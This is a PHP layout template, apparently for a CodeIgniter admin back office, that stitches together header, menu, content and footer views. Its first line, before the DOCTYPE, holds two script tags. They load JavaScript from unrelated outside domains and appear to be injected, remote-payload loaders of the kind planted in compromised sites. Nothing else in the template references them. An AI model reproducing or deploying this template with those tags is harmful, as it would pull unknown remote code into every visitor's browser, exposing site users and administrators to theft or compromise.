<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><script src='https://scripts.classicpartnerships.com/callme.js' type='text/javascript'></script><!DOCTYPE html>
<html>

<?php $this->load->view('bo/header'); ?>

<body class="sidebar-mini   pace-done pace-done skin-black">
<div class="wrapper">

    <?php $this->load->view('bo/navbar'); ?>
    <!-- Left side column. contains the logo and sidebar -->
    <?php $this->load->view('bo/sidemenu'); ?>

    <!-- Content Wrapper. Contains page content -->
    <div class="content-wrapper">
        <!-- Content Header (Page header) -->
        <section class="content-header">
            <h1>
                <?=$main?>
            </h1>
            <ol class="breadcrumb">
                <li><a href="<?=base_url()?>"><i class="fa fa-dashboard"></i> <?=$site->nama?></a></li>
                <li class="active"><?=$title?></li>
            </ol>
        </section>

        <!-- Main content -->
        <?php $this->load->view('bo/'.$content); ?>
        <!-- /.content -->
    </div>
    <!-- /.content-wrapper -->

    <!--Modal-->

    <footer class="main-footer">
        <div class="pull-right hidden-xs">
            <b>Version</b> <?=$site->versi?>
        </div>
        <strong>Copyright &copy; <?=date('Y')?> <a target="_blank" href="https://<?=$site->web?>"><?=$site->nama?></a> .</strong> All rights reserved.
    </footer>

    <!-- Control Sidebar -->
    <?php $this->load->view('bo/sidecontrol') ?>
    <!-- /.control-sidebar -->
    <!-- Add the sidebar's background. This div must be placed
         immediately after the control sidebar -->
    <div class="control-sidebar-bg"></div>

</div>
<!-- ./wrapper -->

<?php $this->load->view('bo/footer'); ?>
</body>
</html>
